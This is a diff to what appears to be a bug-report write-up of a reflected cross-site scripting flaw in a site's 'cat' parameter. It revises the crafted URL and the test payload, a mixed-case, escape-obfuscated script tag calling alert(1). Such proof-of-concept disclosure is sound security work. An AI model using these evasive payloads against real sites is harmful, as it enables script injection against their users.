@@ -18,7 +18,7 @@ The application reflects user-supplied data from the `cat` GET parameter in its 
 3. Open the following crafted URL in a browser:
 
    ```text
-   https://mail.pwnedbox.site/?cat=Yash%27%22%3C%3E%3CScRipT%3Ea\u006cert(1)%3C/ScRipT%3E
+   https://mail.pwnedbox.site/?cat=Yash%27%22%3E%3C%3E%3CSCripT%3Ea\u006cert(1)%3C/SCripT%3E
    ```
 
 4. Allow the page to load with the crafted value supplied through the `cat` parameter.
@@ -29,7 +29,7 @@ The application reflects user-supplied data from the `cat` GET parameter in its 
 **Test Payload:**
 
 ```html
-Priyanshxop'"><><ScRipT>a\u006cert(1)</ScRipT>
+Yash'"><><ScRipT>a\u006cert(1)</ScRipT>
 ```
 
 
